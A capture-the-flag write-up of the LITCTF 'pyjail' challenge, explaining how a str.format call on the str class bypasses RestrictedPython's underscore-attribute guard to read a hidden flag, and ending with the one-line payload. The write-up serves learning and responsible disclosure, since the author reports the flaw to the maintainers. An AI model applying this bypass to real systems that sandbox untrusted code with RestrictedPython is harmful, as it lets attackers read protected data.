# **wow it's another pyjail**
This may or may not require a zeroday.

## **Description**
We get a python file `jail.py`.
```py
from RestrictedPython import safe_globals
from RestrictedPython import utility_builtins
from RestrictedPython import compile_restricted
from RestrictedPython import Eval
from RestrictedPython import PrintCollector
from RestrictedPython import Guards
policy_globals = {**safe_globals, **utility_builtins}
del policy_globals['string'] # ok like who needs string.Formatter tho like i dont
policy_globals['random']._________top_secret_flag_in_here_omg______ = open("flag.txt").read()
cod = input(">>> ")
byte_code = compile_restricted(cod, filename="<string>", mode="eval")
print(eval(byte_code, policy_globals, None))
```

The actual python code uses a library called `RestrictedPython`. According to their repo,
> RestrictedPython is a tool that helps to define a subset of the Python language which allows to provide a program input into a trusted environment. RestrictedPython is not a sandbox system or a secured environment, but it helps to define a trusted environment and execute untrusted code inside of it.

By default, RestrictedPython provides certain modified builtins that indent to prevent malicious code executing. For example, here is the full modified builtins that is provided as `policy_globals`.

```py
{'__builtins__': {'__build_class__': <built-in function __build_class__>, 'None': None, 'False': False, 'True': True, 'abs': <built-in function abs>, 'bool': <class 'bool'>, 'bytes': <class 'bytes'>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'complex': <class 'complex'>, 'divmod': <built-in function divmod>, 'float': <class 'float'>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'int': <class 'int'>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'len': <built-in function len>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'range': <class 'range'>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'slice': <class 'slice'>, 'sorted': <built-in function sorted>, 'str': <class 'str'>, 'tuple': <class 'tuple'>, 'zip': <class 'zip'>, 'ArithmeticError': <class 'ArithmeticError'>, 'AssertionError': <class 'AssertionError'>, 'AttributeError': <class 'AttributeError'>, 'BaseException': <class 'BaseException'>, 'BufferError': <class 'BufferError'>, 'BytesWarning': <class 'BytesWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'EOFError': <class 'EOFError'>, 'EnvironmentError': <class 'OSError'>, 'Exception': <class 'Exception'>, 'FloatingPointError': <class 'FloatingPointError'>, 'FutureWarning': <class 'FutureWarning'>, 'GeneratorExit': <class 'GeneratorExit'>, 'IOError': <class 'OSError'>, 'ImportError': <class 'ImportError'>, 'ImportWarning': <class 'ImportWarning'>, 'IndentationError': <class 'IndentationError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'LookupError': <class 'LookupError'>, 'MemoryError': <class 'MemoryError'>, 'NameError': <class 'NameError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'OSError': <class 'OSError'>, 'OverflowError': <class 'OverflowError'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'ReferenceError': <class 'ReferenceError'>, 'RuntimeError': <class 'RuntimeError'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'StopIteration': <class 'StopIteration'>, 'SyntaxError': <class 'SyntaxError'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'SystemError': <class 'SystemError'>, 'SystemExit': <class 'SystemExit'>, 'TabError': <class 'TabError'>, 'TypeError': <class 'TypeError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'UserWarning': <class 'UserWarning'>, 'ValueError': <class 'ValueError'>, 'Warning': <class 'Warning'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'setattr': <function guarded_setattr at 0x7efe948a51b0>, 'delattr': <function guarded_delattr at 0x7efe948a5510>, '_getattr_': <function safer_getattr at 0x7efe948a55a0>}, 'math': <module 'math' (built-in)>, 'random': <module 'random' from '/usr/lib/python3.10/random.py'>, 'whrandom': <module 'random' from '/usr/lib/python3.10/random.py'>, 'set': <class 'set'>, 'frozenset': <class 'frozenset'>, 'same_type': <function same_type at 0x7efe948a5900>, 'test': <function test at 0x7efe948a7490>, 'reorder': <function reorder at 0x7efe948a7d00>}
```

We can notice some missing builtins, such as `breakpoint`. We can also see some new functions such as `test` and `reorder`, which are added by RestrictedPython. And finally, we can see that some of the methods such as `delattr`, `setattr`, `_getattr`, are replaced with a `guarded_*` or `safer_*` method, also provided by the library.

Finally we can look at the main part of the challenge. The flag is simply an attribute of the `random` module, so all we have to do is access it. As the challenge description hints, this might require a zero day, which gives us a good lead that the RestrictedPython source code would be a good start.

## **Solution**
We can start by looking at the source code of RestrictedPython. A direct start would be to try simply accessing the property in question.

```py
random._________top_secret_flag_in_here_omg______
```

However we will see that this will fail, and looking closer into it locally, we get an error since the attribute we are trying to access starts with an underscore. 
```py
SyntaxError: ('Line 1: "_________top_secret_flag_in_here_omg______" is an invalid attribute name because it starts with "_".',)
```

`RestrictedPython` prevents access to attributes with underscores in the name, which we can see in the implementation of `safer_getattr` in [Guards.py](https://github.com/zopefoundation/RestrictedPython/blob/master/src/RestrictedPython/Guards.py).

```py
def safer_getattr(object, name, default=None, getattr=getattr):
    """Getattr implementation which prevents using format on string objects.

    format() is considered harmful:
    http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/

    """
    if isinstance(object, str) and name == 'format':
        raise NotImplementedError(
            'Using format() on a %s is not safe.' % object.__class__.__name__)
    if name.startswith('_'):
        raise AttributeError(
            '"{name}" is an invalid attribute name because it '
            'starts with "_"'.format(name=name)
        )
    return getattr(object, name, default)
```

Since the base getattr function is being overwritten with this, there is not really any other way to simply access attributes with an underscore. But looking at this source code a bit more closely, we can also see the implemention of getting `format`, along with a link describing some of the dangers of format.

For example, if we try,
```py
"{}".format(1)
```

We get the error,
```py
NotImplementedError: Using format() on a str is not safe.
```

However looking at the implementation, specifically the check in getting format, its clear that there is a flaw in its implementation.
```py
if isinstance(object, str) and name == 'format':
    ...
```

We are restricted from accessing an attribute called function from an object of type string, but we can also access format from `str` directly. `str` is an instance of class `type`, so this check will not prevent access to it.

Format strings also allow accessing attributes in them directly, and we can use parameterized arguments in order to access the intended target attribute.

Final payload:
```py
str.format('{0._________top_secret_flag_in_here_omg______}', random)
```

I am quite happy with this solution, in the end of the CTF, we were the only team to solve this challenge. I was a bit surprised because I believed the actual issue wasn't *tooo* hard to find. In fact, I had actually found this issue over a month prior in UIUCTF. This was not used in the solution to the challenge there, but still was definately an unintended ability in this library. 

Following the CTF, the challenge author and I had reported this to the library maintainers, and they promptly got back to us with a potential fix they intend to use. 

---
## **Flag**: `LITCTF{https://github.com/zopefoundation/RestrictedPython/blob/master/src/RestrictedPython/Guards.py#L249_is_insufficent_so_sad}`
